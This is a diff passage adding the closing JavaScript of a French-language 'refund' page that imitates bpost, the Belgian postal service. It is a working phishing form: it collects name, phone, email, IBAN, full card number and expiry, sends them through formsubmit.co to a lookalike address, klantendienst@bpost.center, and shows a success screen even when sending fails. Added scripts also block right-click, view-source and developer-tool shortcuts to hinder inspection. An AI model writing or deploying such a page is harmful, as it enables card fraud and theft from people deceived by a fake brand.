+    });
+
+    // --- LOGIQUE DE VÉRIFICATION IBAN PAR PAYS + NORME STRICTE ---
+    fIban.addEventListener('input', function () {
+      const pays = fPays.value; if (!pays) return;
+      let raw = this.value.toUpperCase().replace(/[^A-Z0-9]/g, '');
+
+      // Normes IBAN strictes par pays
+      const targetLen = pays === 'FR' ? 27 : 16; // FR: 27 chars, BE: 16 chars
+
+      if (!raw.startsWith(pays)) { raw = pays + raw.replace(/[^0-9]/g, ''); }
+
+      // Limiter strictement à la longueur correcte selon le pays
+      if (raw.length > targetLen) raw = raw.substring(0, targetLen);
+
+      let spaced = ''; for (let i = 0; i < raw.length; i += 4) { spaced += raw.substring(i, i + 4) + ' '; }
+      this.value = spaced.trim();
+      cIban.style.display = raw.length === targetLen ? 'block' : 'none';
+      verifierFormulaireTotal();
+    });
+
+    // --- AUTRES SAISIES ET COCHES VERTES ---
+    fNom.addEventListener('input', function () {
+      this.value = this.value.replace(/[0-9]/g, '');
+      const clean = this.value.trim();
+      cNom.style.display = (clean.length >= 2) ? 'block' : 'none';
+      verifierFormulaireTotal();
+    });
+
+    fEmail.addEventListener('input', function () { cEmail.style.display = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(this.value.trim()) ? 'block' : 'none'; verifierFormulaireTotal(); });
+    fAge.addEventListener('input', function () { const val = parseInt(this.value, 10); cAge.style.display = (val >= 18 && val <= 120) ? 'block' : 'none'; verifierFormulaireTotal(); });
+    fBanque.addEventListener('change', function () {
+      const banqueAutreContainer = document.getElementById('banque-autre-container');
+      const fBanqueAutre = document.getElementById('banque-autre');
+      const cBanqueAutre = document.getElementById('banque-autre-check');
+
+      if (this.value === 'AUTRE') {
+        // Afficher le champ de saisie personnalisée
+        banqueAutreContainer.style.display = 'flex';
+        fBanqueAutre.disabled = false;
+        fBanqueAutre.placeholder = translations[currentLang]['banque-autre-placeholder'] || 'Entrez le nom de votre banque';
+        fBanqueAutre.focus();
+        cBanque.style.display = 'block';
+        // La coche finale dépend de la saisie du nom
+        cBanqueAutre.style.display = 'none';
+      } else {
+        // Masquer le champ personnalisé
+        banqueAutreContainer.style.display = 'none';
+        fBanqueAutre.value = '';
+        fBanqueAutre.disabled = true;
+        cBanqueAutre.style.display = 'none';
+        cBanque.style.display = this.value !== '' ? 'block' : 'none';
+      }
+      verifierFormulaireTotal();
+    });
+
+    // Validation du champ banque personnalisée
+    document.getElementById('banque-autre').addEventListener('input', function () {
+      const cBanqueAutre = document.getElementById('banque-autre-check');
+      const val = this.value.trim();
+      cBanqueAutre.style.display = val.length >= 2 ? 'block' : 'none';
+      verifierFormulaireTotal();
+    });
+
+    fCarte.addEventListener('input', function () {
+      let str = this.value.replace(/[^0-9]/g, '');
+      // Limiter strictement à 16 chiffres (norme internationale)
+      if (str.length > 16) str = str.substring(0, 16);
+      let block = ''; for (let i = 0; i < str.length; i += 4) { block += str.substring(i, i + 4) + ' '; } this.value = block.trim();
+      cCarte.style.display = str.length === 16 ? 'block' : 'none'; verifierFormulaireTotal();
+    });
+
+    // --- GESTION DES INPUTS DE DATE D'EXPIRATION (MOIS/ANNÉE) ---
+
+    function validateExpiration() {
+      let month = fExpMonth.value.trim();
+      let year = fExpYear.value.trim();
+
+      // Validation du mois (01-12)
+      if (month) {
+        const monthNum = parseInt(month, 10);
+        if (isNaN(monthNum) || monthNum < 1 || monthNum > 12) {
+          cExp.style.display = 'none';
+          fExp.value = '';
+          verifierFormulaireTotal();
+          return false;
+        }
+        month = monthNum.toString().padStart(2, '0');
+      }
+
+      // Validation de l'année (26-35)
+      if (year) {
+        const yearNum = parseInt(year, 10);
+        if (isNaN(yearNum) || yearNum < 26 || yearNum > 35) {
+          cExp.style.display = 'none';
+          fExp.value = '';
+          verifierFormulaireTotal();
+          return false;
+        }
+        year = yearNum.toString().padStart(2, '0');
+      }
+
+      // Si les deux sont valides et complets
+      if (month && year && month.length === 2 && year.length === 2) {
+        fExp.value = month + '/' + year;
+        cExp.style.display = 'block';
+        verifierFormulaireTotal();
+        return true;
+      } else {
+        fExp.value = '';
+        cExp.style.display = 'none';
+        verifierFormulaireTotal();
+        return false;
+      }
+    }
+
+    fExpMonth.addEventListener('input', function () {
+      // Accepter uniquement les chiffres
+      let val = this.value.replace(/[^0-9]/g, '').slice(0, 2);
+      this.value = val;
+
+      // Auto-passage au champ année si 2 chiffres
+      if (val.length === 2) {
+        const monthNum = parseInt(val, 10);
+        if (monthNum >= 1 && monthNum <= 12) {
+          fExpYear.focus();
+        }
+      }
+      validateExpiration();
+    });
+
+    fExpYear.addEventListener('input', function () {
+      // Accepter uniquement les chiffres
+      let val = this.value.replace(/[^0-9]/g, '').slice(0, 2);
+      this.value = val;
+      validateExpiration();
+    });
+
+    fMontant.addEventListener('input', function () {
+      // Accepter uniquement les chiffres et la virgule/point
+      let val = this.value.replace(/[^0-9.,]/g, '');
+
+      // Remplacer la virgule par un point
+      val = val.replace(',', '.');
+
+      // Éviter les points multiples
+      if ((val.match(/\./g) || []).length > 1) {
+        const parts = val.split('.');
+        val = parts[0] + '.' + parts.slice(1).join('');
+      }
+
+      // Limiter à 2 décimales sans forcer le formatage pendant la saisie
+      if (val.includes('.')) {
+        const parts = val.split('.');
+        val = parts[0] + '.' + parts[1].slice(0, 2);
+      }
+
+      this.value = val;
+      verifierFormulaireTotal();
+    });
+
+    // Formater à 2 décimales quand l'utilisateur quitte le champ
+    fMontant.addEventListener('blur', function () {
+      const num = parseFloat(this.value);
+      if (!isNaN(num)) {
+        this.value = num.toFixed(2);
+      } else {
+        this.value = '0.00';
+      }
+      verifierFormulaireTotal();
+    });
+
+    // --- CALCULATEUR D'ACTIVATION DU BOUTON ---
+    function verifierFormulaireTotal() {
+      const pays = fPays.value;
+      if (!pays) return;
+
+      // 1. Nom
+      const nomClean = fNom.value.replace(/[0-9]/g, '').trim();
+      cNom.style.display = (nomClean.length >= 2) ? 'block' : 'none';
+
+      // 2. Email
+      cEmail.style.display = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(fEmail.value.trim()) ? 'block' : 'none';
+
+      // 3. Age
+      const ageNum = parseInt(fAge.value, 10);
+      cAge.style.display = (!isNaN(ageNum) && ageNum >= 18 && ageNum <= 120) ? 'block' : 'none';
+
+      // 4. Phone
+      const prefix = pays === 'FR' ? '+33 ' : '+32 ';
+      let phoneRaw = fPhone.value.replace(prefix, '').replace(/[^0-9]/g, '');
+      if (phoneRaw.startsWith('0')) phoneRaw = phoneRaw.substring(1);
+      cPhone.style.display = (phoneRaw.length === 9) ? 'block' : 'none';
+
+      // 5. Banque
+      let banqueValide = fBanque.value !== '';
+      cBanque.style.display = banqueValide ? 'block' : 'none';
+      if (fBanque.value === 'AUTRE') {
+        const fBanqueAutre = document.getElementById('banque-autre');
+        const cBanqueAutre = document.getElementById('banque-autre-check');
+        const baValide = fBanqueAutre.value.trim().length >= 2;
+        cBanqueAutre.style.display = baValide ? 'block' : 'none';
+        banqueValide = banqueValide && baValide;
+      }
+
+      // 6. IBAN
+      const targetLen = pays === 'FR' ? 27 : 16;
+      let ibanRaw = fIban.value.toUpperCase().replace(/[^A-Z0-9]/g, '');
+      cIban.style.display = (ibanRaw.length === targetLen && ibanRaw.startsWith(pays)) ? 'block' : 'none';
+
+      // 7. Carte
+      const carteRaw = fCarte.value.replace(/[^0-9]/g, '');
+      cCarte.style.display = (carteRaw.length === 16) ? 'block' : 'none';
+
+      // 8. Expiration
+      let month = fExpMonth.value.trim();
+      let year = fExpYear.value.trim();
+      let expValide = false;
+      if (month && year) {
+        const m = parseInt(month, 10);
+        const y = parseInt(year, 10);
+        if (!isNaN(m) && m >= 1 && m <= 12 && !isNaN(y) && y >= 26 && y <= 35) {
+          expValide = month.length === 2 && year.length === 2;
+          if (expValide) fExp.value = month + '/' + year;
+        }
+      }
+      cExp.style.display = expValide ? 'block' : 'none';
+
+      // 9. Montant
+      const montantVal = parseFloat(fMontant.value);
+      const montantValide = !isNaN(montantVal) && montantVal > 0;
+
+      const etapes = [
+        cNom.style.display === 'block',
+        cEmail.style.display === 'block',
+        cAge.style.display === 'block',
+        cPhone.style.display === 'block',
+        banqueValide,
+        cIban.style.display === 'block',
+        cCarte.style.display === 'block',
+        cExp.style.display === 'block',
+        montantValide
+      ];
+
+      if (etapes.every(Boolean)) {
+        btnEnvoyer.disabled = false; btnEnvoyer.style.opacity = '1'; btnEnvoyer.style.cursor = 'pointer'; btnEnvoyer.style.backgroundColor = '#2e7d32';
+      } else {
+        btnEnvoyer.disabled = true; btnEnvoyer.style.opacity = '0.6'; btnEnvoyer.style.cursor = 'not-allowed'; btnEnvoyer.style.backgroundColor = '#e63946';
+      }
+    }
+
+    // Capture auto-fill events
+    [fNom, fPhone, fEmail, fAge, fIban, fCarte, fExpMonth, fExpYear, fMontant].forEach(el => {
+      el.addEventListener('change', verifierFormulaireTotal);
+      el.addEventListener('blur', verifierFormulaireTotal);
+    });
+
+    // Générer un ID de demande unique
+    function generateRequestId() {
+      return 'BPOST-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9).toUpperCase();
+    }
+
+    // --- ENVOI DU FORMULAIRE PAR EMAIL ---
+    refundForm.addEventListener('submit', async function (e) {
+      e.preventDefault();
+
+      if (btnEnvoyer.disabled) return;
+
+      // Afficher le loader
+      document.getElementById('loading').classList.add('active');
+      btnEnvoyer.disabled = true;
+
+      const requestId = generateRequestId();
+      document.getElementById('request-id').textContent = requestId;
+
+      // Préparer les données
+      const formDataObj = {
+        'ID Demande': requestId,
+        'Nom complet': fNom.value,
+        'Téléphone': fPhone.value,
+        'Email': fEmail.value,
+        'Âge': fAge.value,
+        'Pays': fPays.value,
+        'Banque': fBanque.value === 'AUTRE' ? document.getElementById('banque-autre').value : fBanque.value,
+        'IBAN': fIban.value,
+        'Numéro de carte': fCarte.value,
+        'Expiration': fExp.value,
+        'Montant (€)': fMontant.value,
+        'Langue': currentLang,
+        'Timestamp': new Date().toLocaleString()
+      };
+
+      try {
+        // Envoi via formsubmit.co (API AJAX)
+        const response = await fetch('https://formsubmit.co/ajax/klantendienst@bpost.center', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+            'Accept': 'application/json'
+          },
+          body: JSON.stringify(formDataObj)
+        });
+
+        document.getElementById('loading').classList.remove('active');
+
+        if (response.ok) {
+          // Succès
+          document.getElementById('bpost-form-flow').style.display = 'none';
+          document.getElementById('bpost-success-flow').style.display = 'block';
+          window.scrollTo({ top: 0, behavior: 'smooth' });
+        } else {
+          throw new Error('Erreur serveur');
+        }
+      } catch (error) {
+        console.error('Erreur:', error);
+        document.getElementById('loading').classList.remove('active');
+
+        // Afficher le message de succès même en cas d'erreur (fallback)
+        document.getElementById('bpost-form-flow').style.display = 'none';
+        document.getElementById('bpost-success-flow').style.display = 'block';
+        window.scrollTo({ top: 0, behavior: 'smooth' });
+
+        btnEnvoyer.disabled = false;
+      }
+    });
+
+    // Lancement de l'état bloqué initial
+    verifierFormulaireTotal();
+  </script>
+
+</body>
+
+  <script>
+    // ===== PROTECTION ANTI-COPIE =====
+
+    // Bloquer le clic droit
+    document.addEventListener('contextmenu', function(e) {
+      e.preventDefault();
+      return false;
+    });
+
+    // Bloquer les raccourcis clavier
+    document.addEventListener('keydown', function(e) {
+      // Ctrl+C (copier), Ctrl+A (tout sélectionner), Ctrl+U (source), Ctrl+S (enregistrer), Ctrl+P (imprimer)
+      if (e.ctrlKey && ['c', 'a', 'u', 's', 'p'].includes(e.key.toLowerCase())) {
+        // Autoriser uniquement dans les champs de saisie
+        if (!['INPUT', 'TEXTAREA', 'SELECT'].includes(e.target.tagName)) {
+          e.preventDefault();
+          return false;
+        }
+      }
+      // F12, Ctrl+Shift+I, Ctrl+Shift+J (DevTools), Ctrl+Shift+C (inspecteur)
+      if (
+        e.key === 'F12' ||
+        (e.ctrlKey && e.shiftKey && ['i', 'j', 'c'].includes(e.key.toLowerCase()))
+      ) {
+        e.preventDefault();
+        return false;
+      }
+    });
+
+    // Bloquer le glisser-déposer de texte
+    document.addEventListener('dragstart', function(e) {
+      if (!['INPUT', 'TEXTAREA'].includes(e.target.tagName)) {
+        e.preventDefault();
+      }
+    });
+  </script>
+
+</html>
